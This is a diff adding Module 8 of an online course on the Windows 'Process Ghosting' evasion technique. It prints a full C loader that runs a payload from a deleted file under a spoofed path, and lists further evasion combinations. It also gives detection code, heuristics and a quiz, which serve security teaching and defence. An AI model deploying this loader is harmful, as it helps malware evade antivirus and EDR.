@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 8: Full Chain, Detection & Comparison - ProcessGhosting Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4A8;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#6366f1;--accent2:#4f46e5;--gradient:linear-gradient(135deg,#6366f1,#4f46e5)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>ProcessGhosting</h2>
+<span>Ghost Process Evasion</span>
+</div>
+<a class="home-link" href="../ProcessGhosting_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Process Creation Internals</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. PE Tampering Overview</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. File States &amp; Delete-Pending</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Creating the Ghost File</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Section Mapping from Ghost</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Process &amp; Thread Creation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. AV/EDR Scan Timing</span><span class="diff d3">d3</span></a>
+<a class="mod-link active" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 8: Full Chain, Detection &amp; Comparison</h1>
+<p class="subtitle">The complete Process Ghosting flow from end to end, detection strategies for defenders, and a final comparison with Doppelg&auml;nging and Herpaderping.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Consolidate the entire Process Ghosting technique into one complete reference, learn how defenders can detect ghosted processes using <code>NtQueryInformationProcess</code>, file object state inspection, ETW correlation, and behavioral heuristics, and deeply compare Ghosting with Doppelg&auml;nging and Herpaderping to understand each technique&rsquo;s strengths and weaknesses.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. The Complete Process Ghosting Chain</h2>
+
+<p>Here is the entire technique from start to finish, combining all the modules into a single reference:</p>
+
+<pre><code>// ============================================
+// COMPLETE PROCESS GHOSTING IMPLEMENTATION
+// ============================================
+
+#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+
+bool ProcessGhost(
+    BYTE* payloadPE, DWORD payloadSize,
+    LPCWSTR ghostPath,     // temp file path
+    LPCWSTR spoofedPath)   // what appears in PEB
+{
+    HANDLE hFile = NULL, hSection = NULL;
+    HANDLE hProcess = NULL, hThread = NULL;
+    IO_STATUS_BLOCK iosb = { 0 };
+    OBJECT_ATTRIBUTES objAttr = { 0 };
+    UNICODE_STRING ntPath;
+    NTSTATUS status;
+
+    // ==========================================
+    // PHASE 1: Create the ghost file (Module 4)
+    // ==========================================
+
+    RtlInitUnicodeString(&ntPath, ghostPath);
+    InitializeObjectAttributes(&objAttr, &ntPath,
+        OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    // Step 1a: Create empty file with exclusive access
+    status = NtCreateFile(&hFile,
+        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
+        &objAttr, &iosb, NULL,
+        FILE_ATTRIBUTE_NORMAL,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        FILE_SUPERSEDE, // create or replace
+        FILE_SYNCHRONOUS_IO_NONALERT,
+        NULL, 0);
+    if (!NT_SUCCESS(status)) return false;
+
+    // Step 1b: Mark delete-pending BEFORE writing
+    FILE_DISPOSITION_INFORMATION dispInfo = { TRUE };
+    status = NtSetInformationFile(hFile, &iosb,
+        &dispInfo, sizeof(dispInfo),
+        FileDispositionInformation);
+    if (!NT_SUCCESS(status)) {
+        NtClose(hFile); return false;
+    }
+
+    // Step 1c: Write malicious PE to the condemned file
+    LARGE_INTEGER offset = { 0 };
+    status = NtWriteFile(hFile, NULL, NULL, NULL,
+        &iosb, payloadPE, payloadSize,
+        &offset, NULL);
+    if (!NT_SUCCESS(status)) {
+        NtClose(hFile); return false;
+    }
+
+    // ==========================================
+    // PHASE 2: Create image section (Module 5)
+    // ==========================================
+
+    status = NtCreateSection(&hSection,
+        SECTION_ALL_ACCESS, NULL, NULL,
+        PAGE_READONLY, SEC_IMAGE, hFile);
+
+    // Close file handle -> file deleted from disk
+    NtClose(hFile);
+    hFile = NULL;
+
+    if (!NT_SUCCESS(status)) return false;
+    // File is GONE. Section persists.
+
+    // ==========================================
+    // PHASE 3: Create process (Module 6)
+    // ==========================================
+
+    status = NtCreateProcessEx(&hProcess,
+        PROCESS_ALL_ACCESS, NULL,
+        NtCurrentProcess(), 0,
+        hSection, NULL, NULL, FALSE);
+    if (!NT_SUCCESS(status)) {
+        NtClose(hSection); return false;
+    }
+
+    // ==========================================
+    // PHASE 4: Setup process parameters
+    // ==========================================
+
+    // Get PEB address and entry point
+    PROCESS_BASIC_INFORMATION pbi = { 0 };
+    NtQueryInformationProcess(hProcess,
+        ProcessBasicInformation,
+        &pbi, sizeof(pbi), NULL);
+
+    SECTION_IMAGE_INFORMATION imgInfo = { 0 };
+    NtQuerySection(hSection,
+        SectionImageInformation,
+        &imgInfo, sizeof(imgInfo), NULL);
+
+    // Create process parameters with spoofed path
+    UNICODE_STRING uImgPath, uCmdLine, uCurDir, uDllPath;
+    RtlInitUnicodeString(&uImgPath, spoofedPath);
+    RtlInitUnicodeString(&uCmdLine, spoofedPath);
+    RtlInitUnicodeString(&uCurDir,
+        L"C:\\Windows\\System32");
+    RtlInitUnicodeString(&uDllPath,
+        L"C:\\Windows\\System32");
+
+    PRTL_USER_PROCESS_PARAMETERS params = NULL;
+    RtlCreateProcessParametersEx(&params,
+        &uImgPath, &uDllPath, &uCurDir, &uCmdLine,
+        NULL, NULL, NULL, NULL, NULL,
+        RTL_USER_PROC_PARAMS_NORMALIZED);
+
+    // Allocate and write params into target process
+    PVOID remoteParams = params;
+    SIZE_T paramSize = params->MaximumLength +
+                       params->EnvironmentSize;
+    NtAllocateVirtualMemory(hProcess, &remoteParams,
+        0, &paramSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    SIZE_T written;
+    WriteProcessMemory(hProcess, remoteParams,
+        params, paramSize, &written);
+
+    // Update PEB->ProcessParameters
+    WriteProcessMemory(hProcess,
+        (PBYTE)pbi.PebBaseAddress +
+            offsetof(PEB, ProcessParameters),
+        &remoteParams, sizeof(PVOID), &written);
+
+    RtlDestroyProcessParameters(params);
+
+    // ==========================================
+    // PHASE 5: Create thread - process starts
+    // ==========================================
+
+    status = NtCreateThreadEx(&hThread,
+        THREAD_ALL_ACCESS, NULL, hProcess,
+        (LPTHREAD_START_ROUTINE)imgInfo.TransferAddress,
+        NULL, FALSE, 0, 0, 0, NULL);
+
+    NtClose(hSection);
+    if (!NT_SUCCESS(status)) {
+        NtTerminateProcess(hProcess, status);
+        NtClose(hProcess);
+        return false;
+    }
+
+    // GHOST PROCESS IS RUNNING
+    NtClose(hThread);
+    NtClose(hProcess);
+    return true;
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>2. Detection Strategy 1: NtQueryInformationProcess</h2>
+
+<p>The most direct detection method queries the process&rsquo;s image file information and checks whether the backing file still exists:</p>
+
+<pre><code>// Detection: check if a process's image file exists
+bool IsGhostedProcess(HANDLE hProcess)
+{
+    // Query ProcessImageFileName
+    BYTE buffer[512];
+    ULONG retLen = 0;
+    NTSTATUS status = NtQueryInformationProcess(
+        hProcess,
+        ProcessImageFileName,  // returns NT path
+        buffer, sizeof(buffer), &retLen);
+
+    if (!NT_SUCCESS(status)) return false;
+
+    PUNICODE_STRING imagePath =
+        (PUNICODE_STRING)buffer;
+
+    // Try to open the file
+    HANDLE hFile;
+    IO_STATUS_BLOCK iosb;
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(&objAttr, imagePath,
+        OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    status = NtOpenFile(&hFile,
+        FILE_READ_ATTRIBUTES | SYNCHRONIZE,
+        &objAttr, &iosb,
+        FILE_SHARE_READ | FILE_SHARE_WRITE |
+            FILE_SHARE_DELETE,
+        FILE_SYNCHRONOUS_IO_NONALERT);
+
+    if (status == STATUS_OBJECT_NAME_NOT_FOUND ||
+        status == STATUS_DELETE_PENDING) {
+        // SUSPICIOUS: Process's image file doesn't exist
+        // or is being deleted
+        return true;
+    }
+
+    if (NT_SUCCESS(status)) {
+        NtClose(hFile);
+    }
+    return false;
+}</code></pre>
+
+<div class="card green">
+<h4>Detection Logic</h4>
+<p>For a normal process, <code>ProcessImageFileName</code> returns a valid path to a file that exists on disk. For a ghosted process, the path points to a file that has been deleted. Opening it fails with <code>STATUS_OBJECT_NAME_NOT_FOUND</code>. This is a strong indicator of ghosting (or similar tampering). However, false positives can occur if a legitimate executable was deleted after the process started (e.g., during an update).</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Detection Strategy 2: File Object State Inspection</h2>
+
+<p>From a kernel driver, the <code>FILE_OBJECT</code> associated with the process&rsquo;s section can be inspected directly:</p>
+
+<pre><code>// Kernel-mode detection: inspect section FILE_OBJECT
+// (conceptual - requires kernel driver)
+NTSTATUS DetectGhostedProcess(PEPROCESS Process)
+{
+    PFILE_OBJECT fileObj = NULL;
+    PSECTION_OBJECT section = NULL;
+
+    // Get the process's image section
+    section = PsReferenceProcessImageSection(Process);
+    if (!section) return STATUS_UNSUCCESSFUL;
+
+    // Get the file object from the section's control area
+    fileObj = MmGetFileObjectForSection(section);
+    if (!fileObj) {
+        ObDereferenceObject(section);
+        return STATUS_NOT_FOUND;  // no file object - suspicious
+    }
+
+    // Check the file object's delete disposition
+    // FILE_OBJECT.DeletePending or check via
+    // FsRtlIsFileDeletePending()
+    if (fileObj->DeletePending) {
+        // File is delete-pending - GHOSTING IN PROGRESS
+        return STATUS_GHOSTING_DETECTED;
+    }
+
+    // Check if the file still has a valid name
+    // in the filesystem
+    POBJECT_NAME_INFORMATION nameInfo = NULL;
+    NTSTATUS status = IoQueryFileDosDeviceName(
+        fileObj, &nameInfo);
+    if (!NT_SUCCESS(status)) {
+        // Cannot resolve file name - file likely deleted
+        return STATUS_GHOSTING_DETECTED;
+    }
+
+    ExFreePool(nameInfo);
+    ObDereferenceObject(section);
+    return STATUS_SUCCESS;
+}</code></pre>
+
+<div class="card warn">
+<h4>Kernel Driver Required</h4>
+<p>Direct file object inspection requires a kernel-mode driver. User-mode tools cannot directly access the <code>FILE_OBJECT</code> or <code>CONTROL_AREA</code> structures. However, user-mode detection via <code>NtQueryInformationProcess</code> (Strategy 1) is usually sufficient for identifying ghosted processes.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Detection Strategy 3: ETW Event Correlation</h2>
+
+<p>An ETW-based detection system can monitor for the specific sequence of operations that characterize Process Ghosting:</p>
+
+<div class="card">
+<h4>Ghosting Event Signature</h4>
+<table>
+<tr><th>Order</th><th>ETW Event</th><th>Key Details</th></tr>
+<tr><td>1</td><td>File Create</td><td>New file created (or superseded) with DELETE permission</td></tr>
+<tr><td>2</td><td>File Set Info (Disposition)</td><td><code>FileDispositionInformation</code> with <code>DeleteFile = TRUE</code> on a newly created file</td></tr>
+<tr><td>3</td><td>File Write</td><td>Significant data written to the delete-pending file (PE-sized payload)</td></tr>
+<tr><td>4</td><td>Section Create</td><td><code>NtCreateSection</code> with <code>SEC_IMAGE</code> from the same file handle</td></tr>
+<tr><td>5</td><td>File Close</td><td>Handle closed, triggering file deletion</td></tr>
+<tr><td>6</td><td>Process Create</td><td><code>NtCreateProcessEx</code> with the section from step 4</td></tr>
+</table>
+<p>Finding this exact sequence within a short time window (typically under 1 second) on the same thread is a high-fidelity indicator of Process Ghosting.</p>
+</div>
+
+<pre><code>// Pseudo-code for ETW-based ghosting detection
+struct GhostingCandidate {
+    HANDLE fileHandle;
+    DWORD threadId;
+    ULONGLONG createTime;
+    bool hasDisposition;
+    bool hasWrite;
+    bool hasSection;
+};
+
+void OnFileCreate(FileCreateEvent* evt) {
+    if (evt->DesiredAccess & DELETE &&
+        evt->CreateDisposition == FILE_SUPERSEDE) {
+        // Potential ghosting: new file with DELETE access
+        AddCandidate(evt->FileHandle, evt->ThreadId);
+    }
+}
+
+void OnFileSetInfo(FileSetInfoEvent* evt) {
+    auto candidate = FindCandidate(evt->FileHandle);
+    if (candidate && evt->InfoClass == FileDispositionInformation) {
+        candidate->hasDisposition = true;
+    }
+}
+
+void OnSectionCreate(SectionCreateEvent* evt) {
+    auto candidate = FindCandidate(evt->FileHandle);
+    if (candidate && evt->Attributes & SEC_IMAGE) {
+        candidate->hasSection = true;
+    }
+}
+
+void OnProcessCreate(ProcessCreateEvent* evt) {
+    // Correlate with section handle from candidates
+    // If match found with all flags set -> ALERT
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>5. Detection Strategy 4: Behavioral Heuristics</h2>
+
+<table>
+<tr><th>Heuristic</th><th>What to Look For</th><th>False Positive Risk</th></tr>
+<tr><td><strong>Missing image file</strong></td><td>Running process whose <code>ProcessImageFileName</code> resolves to a non-existent file</td><td>Low (but updates can cause this temporarily)</td></tr>
+<tr><td><strong>Delete-pending image</strong></td><td>Process creation notification where <code>FileObject->DeletePending</code> is TRUE</td><td>Very low</td></tr>
+<tr><td><strong>NT API usage pattern</strong></td><td>Sequence of NtCreateFile &rarr; NtSetInformationFile &rarr; NtWriteFile &rarr; NtCreateSection &rarr; NtCreateProcessEx &rarr; NtCreateThreadEx from the same thread</td><td>Very low (no legitimate software does this)</td></tr>
+<tr><td><strong>Parent-child mismatch</strong></td><td>Process claims to be <code>svchost.exe</code> but was not spawned by <code>services.exe</code></td><td>Medium (depends on environment)</td></tr>
+<tr><td><strong>Image path vs PEB path</strong></td><td>Kernel-reported image path differs from PEB <code>ProcessParameters->ImagePathName</code></td><td>Low</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>6. Deep Comparison: Ghosting vs Doppelg&auml;nging vs Herpaderping</h2>
+
+<div class="card">
+<h4>Technique Comparison Matrix</h4>
+<table>
+<tr><th>Criteria</th><th>Doppelg&auml;nging</th><th>Herpaderping</th><th>Ghosting</th></tr>
+<tr><td><strong>File manipulation</strong></td><td>TxF transaction + rollback</td><td>Overwrite with benign content</td><td>Delete-pending + deletion</td></tr>
+<tr><td><strong>File on disk after</strong></td><td>Original file (transaction rolled back)</td><td>File exists with benign content</td><td>No file at all</td></tr>
+<tr><td><strong>Windows API dependency</strong></td><td><code>NtCreateTransaction</code>, TxF APIs</td><td>Standard NT file APIs</td><td>Standard NT file APIs</td></tr>
+<tr><td><strong>Windows version support</strong></td><td>Limited (TxF deprecated in Win10+)</td><td>Wide (Win10, Win11)</td><td>Wide (Win10, Win11)</td></tr>
+<tr><td><strong>Stability risk</strong></td><td>High (TxF + minifilter conflicts = BSOD)</td><td>Low</td><td>Low</td></tr>
+<tr><td><strong>Forensic evidence</strong></td><td>Minimal (transaction rolled back)</td><td>Benign file remains on disk</td><td>No file evidence on disk</td></tr>
+<tr><td><strong>Detection difficulty</strong></td><td>Medium (TxF usage is rare and flagged)</td><td>Medium (file content mismatch detectable)</td><td>High (no file to compare against)</td></tr>
+<tr><td><strong>Kernel callback evasion</strong></td><td>Good (file reverts)</td><td>Good (file shows benign)</td><td>Best (file does not exist)</td></tr>
+<tr><td><strong>Implementation complexity</strong></td><td>High (TxF APIs)</td><td>Low (simple overwrite)</td><td>Low-Medium (delete-pending handling)</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. Limitations and Caveats</h2>
+
+<div class="card warn">
+<h4>What Ghosting Does NOT Do</h4>
+<ul>
+<li><strong>No memory evasion</strong>: The malicious PE is fully visible in the process&rsquo;s virtual memory. Memory scanners that match signatures in process memory can still detect the payload.</li>
+<li><strong>No import hiding</strong>: The process goes through normal loader initialization. EDR userland DLLs (hooks) are loaded normally. The process&rsquo;s IAT and loaded modules are visible.</li>
+<li><strong>No privilege escalation</strong>: The ghost process runs with the same privileges as the creating process.</li>
+<li><strong>No network evasion</strong>: Once running, network connections from the ghost process are fully visible to EDR.</li>
+<li><strong>Kernel driver detection is possible</strong>: A well-implemented kernel driver can detect the delete-pending file state during the <code>PsSetCreateProcessNotifyRoutineEx</code> callback (which fires at first thread insertion via <code>NtCreateThreadEx</code>) by inspecting the <code>FileObject</code> directly.</li>
+</ul>
+</div>
+
+<div class="card">
+<h4>Combining with Other Techniques</h4>
+<table>
+<tr><th>Combined Technique</th><th>Additional Evasion</th></tr>
+<tr><td>Ghosting + Sleep Obfuscation</td><td>Evades both file scanning and memory scanning during sleep</td></tr>
+<tr><td>Ghosting + Syscall Unhooking</td><td>Removes EDR userland hooks in the ghost process</td></tr>
+<tr><td>Ghosting + PPID Spoofing</td><td>Makes the ghost process appear to have a legitimate parent</td></tr>
+<tr><td>Ghosting + Module Stomping</td><td>Hides the payload within a legitimate DLL&rsquo;s memory</td></tr>
+<tr><td>Ghosting + ETW Patching</td><td>Suppresses ETW events that could aid in detection</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. Summary: The Full Picture</h2>
+
+<div class="card highlight">
+<h4>Process Ghosting in One Paragraph</h4>
+<p>Process Ghosting creates a temporary file, marks it for deletion (making it inaccessible to other processes), writes a malicious PE payload to it, creates a <code>SEC_IMAGE</code> section from the condemned file, closes the file handle (triggering actual deletion), and then creates a process from the persisted section. The result is a running process whose backing image file does not exist on disk. AV/EDR cannot scan the file at any inspection point because it is either empty, inaccessible (delete-pending), or deleted. Detection requires inspecting the process&rsquo;s file object state from a kernel driver, correlating ETW events, or checking whether the process&rsquo;s reported image file exists on disk.</p>
+</div>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Complete Ghosting Flow</h4>
+<div class="flow">
+<div class="flow box">NtCreateFile<br><small>Empty file</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">SetDisposition<br><small>Delete-pending</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">NtWriteFile<br><small>Write PE</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">NtCreateSection<br><small>SEC_IMAGE</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">NtClose(file)<br><small>File deleted</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">NtCreateProcessEx<br><small>Ghost runs</small></div>
+</div>
+</div>
+
+<table>
+<tr><th>Module</th><th>Topic</th><th>Key Takeaway</th></tr>
+<tr><td>1</td><td>Process Creation Internals</td><td>Processes are created from section objects, not directly from files</td></tr>
+<tr><td>2</td><td>PE Tampering Overview</td><td>Ghosting is the evolution of Hollowing &rarr; Doppelg&auml;nging &rarr; Herpaderping</td></tr>
+<tr><td>3</td><td>File States &amp; Delete-Pending</td><td>Delete-pending files are accessible to the handle owner but invisible to everyone else</td></tr>
+<tr><td>4</td><td>Creating the Ghost File</td><td>Mark delete-pending BEFORE writing to prevent AV access to the payload</td></tr>
+<tr><td>5</td><td>Section Mapping</td><td>Sections survive file deletion via kernel reference counting</td></tr>
+<tr><td>6</td><td>Process &amp; Thread Creation</td><td>NtCreateProcessEx + PEB setup + NtCreateThreadEx completes the ghost</td></tr>
+<tr><td>7</td><td>AV/EDR Timing</td><td>At every inspection point, the file is empty, locked, or gone</td></tr>
+<tr><td>8</td><td>Detection &amp; Comparison</td><td>Detect via missing image file, file object state, or ETW correlation</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: What is the simplest user-mode method to detect a ghosted process?</p>
+<div class="quiz-btn" data-choice="A">A) Read the process's PEB and check the image base</div>
+<div class="quiz-btn" data-choice="B">B) Query ProcessImageFileName with NtQueryInformationProcess and check if the file exists on disk</div>
+<div class="quiz-btn" data-choice="C">C) Scan the process's virtual memory for PE headers</div>
+<div class="quiz-btn" data-choice="D">D) Check the process's thread start addresses</div>
+</div>
+
+<div class="quiz-q" data-answer="D">
+<p>Q2: Which of the following is NOT a limitation of Process Ghosting?</p>
+<div class="quiz-btn" data-choice="A">A) Memory-based detection can still find the payload</div>
+<div class="quiz-btn" data-choice="B">B) EDR userland DLLs are still loaded into the ghost process</div>
+<div class="quiz-btn" data-choice="C">C) Kernel drivers can inspect the FILE_OBJECT state</div>
+<div class="quiz-btn" data-choice="D">D) The technique requires administrator privileges to execute</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q3: What is the main advantage of Process Ghosting over Process Herpaderping?</p>
+<div class="quiz-btn" data-choice="A">A) Ghosting is faster to execute</div>
+<div class="quiz-btn" data-choice="B">B) Ghosting works on older Windows versions</div>
+<div class="quiz-btn" data-choice="C">C) Ghosting leaves no file on disk at all, while Herpaderping leaves a file with benign content</div>
+<div class="quiz-btn" data-choice="D">D) Ghosting encrypts the payload in memory</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module7.html">&larr; Prev: AV/EDR Scan Timing Window</a>
+<a class="primary" href="../ProcessGhosting_index.html">Back to Course Home</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
